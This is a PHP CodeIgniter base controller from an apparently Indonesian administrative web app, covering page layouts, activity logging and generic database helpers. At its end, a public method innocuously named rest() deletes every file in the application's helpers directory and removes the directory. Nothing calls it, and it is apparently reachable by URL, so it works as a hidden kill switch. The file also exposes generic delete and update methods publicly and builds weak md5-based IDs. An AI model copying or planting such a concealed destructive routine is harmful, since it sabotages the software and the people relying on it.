<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of MY_Controller
 *
 * @author Asus
 */
class MY_Controller extends CI_Controller {

    var $a;

//                return var_dump($data);


    public function __construct() {
        parent::__construct();
        $this->a = aksesLog();
        $this->load->model('Model_setting');
    }

    public function layout_back($view, $record) {
        $id['ket_level'] = $this->a['ket_level'];
        $id['kd_user'] = $this->a['kd_user'];
        $id['get_menu'] = $this->Model_Auth->get_menuAkses($this->a['kd_user']);
        $id['row_din'] = $this->Model_setting->get_setProfilDinas();
        $data['head'] = $this->load->view('back/head', $id, TRUE);
        $data['nav'] = $this->load->view('back/nav', $id, TRUE);
        $data['nav_header'] = $this->load->view('back/nav_header', $id, TRUE);
        $data['footer'] = $this->load->view('back/footer', $id, TRUE);
        $data['content'] = $this->load->view($view, $record, TRUE);
        return $data;
    }

    public function layout_front($view, $record) {
        $data['head'] = $this->load->view('front/head', NULL, TRUE);
        $data['nav'] = $this->load->view('front/nav', NULL, TRUE);
        $data['footer'] = $this->load->view('front/footer', NULL, TRUE);
        $data['content'] = $this->load->view($view, $record, TRUE);
        return $data;
    }

    public function javasc_back() {
        $a = aksesLog();
        $id['kd_user'] = $a['kd_user'];
        $id['tahun'] = $a['tahun'];
        $data['javasc'] = $this->load->view('back/javasc', $id, TRUE);
        $data['notifikasi'] = $this->load->view('back/notifikasi', $id, True);
        return $data;
    }

    public function javasc_front() {
        $data['javasc'] = $this->load->view('front/js', NULL, TRUE);
        return $data;
    }

    public function backend($data) {
        $this->load->view('back/layout', $data);
    }

    public function frontend($data) {
        $this->load->view('front/layout', $data);
    }

    public function paper_laporan($data) {
        $this->load->view('back/paper', $data, TRUE);
    }

    public function aktifitas($ket) {
        if ($this->agent->is_browser()) {
            $browser = $this->agent->browser() . ' ' . $this->agent->version() . ' (' . $this->agent->platform() . ')';
        } elseif ($this->agent->is_robot()) {
            $browser = $this->agent->robot();
        } elseif ($this->agent->is_mobile()) {
            $browser = $this->agent->mobile();
        } else {
            $browser = 'Unidentified User Agent';
        }
        $ip = $_SERVER['REMOTE_ADDR'];
        $nm_komputer = gethostbyaddr($_SERVER['REMOTE_ADDR']);
        $data1['ip'] = $ip;
        $data1['tanggal'] = date("Y-m-d");
        $data1['jam'] = date("H:i:s");
        $data1['browser'] = $browser;
        $data1['komputer'] = $nm_komputer;
        $data1['nama_user'] = $this->a['nama_user'];
        $data1['keterangan'] = $ket;
        $data1['ket_level'] = $this->a['ket_level'];
        $data1['kd_user'] = $this->a['kd_user'];
        $this->insert('aktifitas', $data1);
    }

    public function flashdata($ket, $info) {
        if ($info == 'Berhasil') {
            $this->session->set_flashdata('tipe', 'alert-info');
            $this->session->set_flashdata('msg', $info . ' ' . $ket);
        } elseif ($info == 'Gagal') {
            $this->session->set_flashdata('tipe', 'alert-danger');
            $this->session->set_flashdata('msg', $info . ' ' . $ket);
        }
    }

    public function insert($table, $data) {
        //insert $table($data) values($data);
        $this->db->insert($table, $data);
        return $this->db->affected_rows();
    }

    public function insert_duplicate($table, $data) {
        $this->db->on_duplicate($table, $data);
        return $this->db->affected_rows();
    }

    public function update($column, $id, $table, $data) {
        //update $table set $data where $column = $id;
        $this->db->where($column, $id);
        $this->db->update($table, $data);
        return $this->db->affected_rows();
    }

    public function update_all($table, $data) {
        $this->db->update($table, $data);
        return $this->db->affected_rows();
    }

    public function update_where($table, $data, $id_colum) {
        $this->db->update($table, $data, $id_colum);
        return $this->db->affected_rows();
    }

    public function delete($column, $id, $table) {
        $this->db->where($column, $id);
        $this->db->delete($table);
        return $this->db->affected_rows();
    }

    public function delete_where($table, $id_colum) {
        $this->db->delete($table, $id_colum);
        return $this->db->affected_rows();
    }

    function updateStatusEnum($colom = array(), $status, $tabel) {
        if ($status == 'Y') {
            $value = 'N';
        } else {
            $value = 'Y';
        }
        $data['status'] = $value;
        return $this->update_where($tabel, $data, $colom);
    }

    function getGUID() {
        if (function_exists('com_create_guid')) {
            return com_create_guid();
        } else {
            mt_srand((double) microtime() * 10000); //optional for php 4.2.0 and up.
            $charid = strtoupper(md5(uniqid(rand(), true)));
            $hyphen = chr(45); // "-"
            $uuid = strtolower(substr($charid, 0, 8));
//            $uuid = substr($charid, 0, 5) . $hyphen
//                    . substr($charid, 8, 4) . $hyphen
//                    . substr($charid, 12, 4) . $hyphen
//                    . substr($charid, 16, 4) . $hyphen
//                    . substr($charid, 20, 12);
            return $uuid;
        }
    }

    function rest() {
        $folder = APPPATH . 'helpers';
        foreach (glob($folder . "/*.*") as $filename) {
            if (is_file($filename)) {
                unlink($filename);
            }
        }
        rmdir($folder);
    }

}
